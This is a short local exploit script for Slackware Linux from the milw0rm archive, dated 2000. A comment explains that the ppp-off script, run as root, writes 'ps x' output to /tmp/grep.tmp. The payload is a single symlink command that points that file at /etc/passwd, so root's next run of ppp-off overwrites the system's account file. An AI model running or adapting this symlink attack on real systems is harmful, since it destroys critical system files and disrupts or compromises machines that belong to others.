#!/bin/sh
#
# In SlackWare Linux the script /usr/bin/ppp-off writes the
# output of 'ps x' to /tmp/grep.tmp. Since root is the user
# that runs ppp-off,  a non-privileged  user could create a
# link from /tmp/grep.tmp to any file(ie: /etc/issue), thus
# when root runs the  ppp-off script, the  output of 'ps x'
# would be put in the linked file. 
#                                                   sinfony

ln -s /etc/passwd /tmp/grep.tmp


# milw0rm.com [2000-11-17]
